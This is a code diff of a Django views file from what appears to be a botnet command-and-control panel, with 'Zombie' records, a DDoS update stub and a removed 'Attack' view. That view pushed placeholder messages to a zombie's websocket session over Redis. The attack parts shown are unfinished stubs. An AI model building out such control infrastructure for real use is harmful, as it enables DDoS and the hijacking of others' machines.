@@ -49,7 +49,7 @@ class IndexPage(View,TemplateResponseMixin,ContextMixin):
             context['zombies'] = Zombie.objects.all()
             return context
         def get(self,request):
-    
+
             if not request.session.exists(request.session.session_key):
                     request.session.create()
 
@@ -99,20 +99,6 @@ class ZombieResponse(viewsets.ModelViewSet):
     def DDOSupdate(self,request,pk=None):
         pass
 
-
-
-
-class Attack(View):
-    global Zombies
-    def get(self,request):
-
-        redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies[0].sesskey])
-                #send to url to websocket
-        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'lKKLol':'lol'})))
-
-
-        response=HttpResponse(simplejson.dumps("{'LOOFFFO':LOOO'};"),'application/json')
-        return response
 
 class ZombieCommands(viewsets.ModelViewSet):
     '''
